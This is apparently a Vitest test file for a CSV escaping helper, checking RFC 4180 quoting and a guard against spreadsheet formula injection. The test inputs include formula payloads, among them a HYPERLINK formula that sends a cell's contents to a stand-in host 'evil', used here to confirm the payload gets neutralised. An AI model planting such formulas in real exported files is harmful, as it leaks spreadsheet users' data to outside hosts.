import { describe, it, expect } from 'vitest';
import { csvEscape, csvRow } from '../csv-escape.js';

describe('csvEscape', () => {
  it('passes plain values through untouched', () => {
    expect(csvEscape('hello')).toBe('hello');
    expect(csvEscape('USD')).toBe('USD');
    expect(csvEscape('123')).toBe('123');
  });

  it('coerces null / undefined to empty string', () => {
    expect(csvEscape(null)).toBe('');
    expect(csvEscape(undefined)).toBe('');
    expect(csvEscape('')).toBe('');
  });

  it('RFC 4180: quotes + doubles embedded quotes when a comma is present', () => {
    expect(csvEscape('a,b')).toBe('"a,b"');
    expect(csvEscape('say "hi"')).toBe('"say ""hi"""');
    expect(csvEscape('line1\nline2')).toBe('"line1\nline2"');
    expect(csvEscape('has\rcr')).toBe('"has\rcr"');
  });

  // X-PRIV-11 — the formula-injection guard is the whole point of
  // routing the user CSV + tax script through this shared escaper.
  describe('formula-injection guard', () => {
    it('prefixes a leading = with a single quote', () => {
      expect(csvEscape('=1+1')).toBe("'=1+1");
    });

    it('prefixes a leading + - @ with a single quote', () => {
      expect(csvEscape('+1')).toBe("'+1");
      expect(csvEscape('-1')).toBe("'-1");
      expect(csvEscape('@SUM(A1)')).toBe("'@SUM(A1)");
    });

    it('prefixes a leading tab / carriage-return with a single quote', () => {
      // The tab-prefixed value has no comma/quote/newline so it is not
      // additionally RFC-4180-quoted.
      expect(csvEscape('\tx')).toBe("'\tx");
      // A leading CR triggers BOTH the formula prefix and the RFC-4180
      // quote-wrap (CR is a special char), so the leading-quote ends up
      // inside the wrapping quotes.
      expect(csvEscape('\rx')).toBe('"\'\rx"');
    });

    it('neutralises the classic HYPERLINK exfil payload', () => {
      const payload = '=HYPERLINK("http://evil/"&A1)';
      const escaped = csvEscape(payload);
      // The leading `=` is neutralised with a `'`; because the payload
      // also contains double-quotes it is then RFC-4180-wrapped, so the
      // neutralising quote lands just inside the wrapping quotes. Net
      // effect: a spreadsheet treats the cell as the literal text
      // `'=HYPERLINK(...)`, never a live formula.
      expect(escaped).toBe('"\'=HYPERLINK(""http://evil/""&A1)"');
      expect(escaped).not.toMatch(/^=/);
    });

    it('does not touch a formula char that is not leading', () => {
      expect(csvEscape('a=b')).toBe('a=b');
      expect(csvEscape('1-2')).toBe('1-2');
    });
  });
});

describe('csvRow', () => {
  it('joins escaped cells with commas', () => {
    expect(csvRow(['a', 'b', 'c'])).toBe('a,b,c');
  });

  it('escapes each cell and renders null / undefined as empty', () => {
    expect(csvRow(['=cmd', null, 'a,b', undefined])).toBe('\'=cmd,,"a,b",');
  });
});
